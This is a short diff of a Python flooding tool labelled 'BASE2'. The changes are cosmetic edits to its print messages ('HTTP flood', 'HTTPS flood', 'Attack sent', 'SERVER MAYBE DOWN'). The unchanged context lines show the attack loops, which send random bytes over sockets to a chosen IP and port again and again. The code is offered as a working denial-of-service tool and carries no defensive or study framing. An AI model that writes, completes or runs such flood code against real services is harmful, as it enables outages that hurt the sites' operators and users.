@@ -74,9 +74,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[33mBASE2  \033[31mHTTP flood  \033[36m" +str(ip)+ " \033[0m")
+			print(i +" \033[33mBASE2  \033[31mHTTP  flood  \033[36m" +str(ip)+ " \033[0m")
 		except:
-			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
+			print("[!] \033[94mBASE2  \033[35mSERVER  \033[91mMAYBE  \033[31mDOWN..!! \033[0m")
 
 def run2():
 	data = random._urandom(999)
@@ -88,10 +88,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *" \033[33mBASE2  \033[94mHTTPS flood"  +str(ip)+ " \033[0m")
+			print(i *" \033[33mBASE2  \033[94mHTTPS  flood"  +str(ip)+ " \033[0m")
 		except:
 			s.close()
-			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
+			print("[!] \033[94mBASE2  \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
 			
             
 
@@ -105,10 +105,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
+			print(i *"\033[92mBASE2  \033[92mAttack  sent \033[31m" +str(ip)+ "\033[0m")
 		except:
 			s.close()
-			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
+			print("[!] \033[94mBASE2  \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
 			
             
   
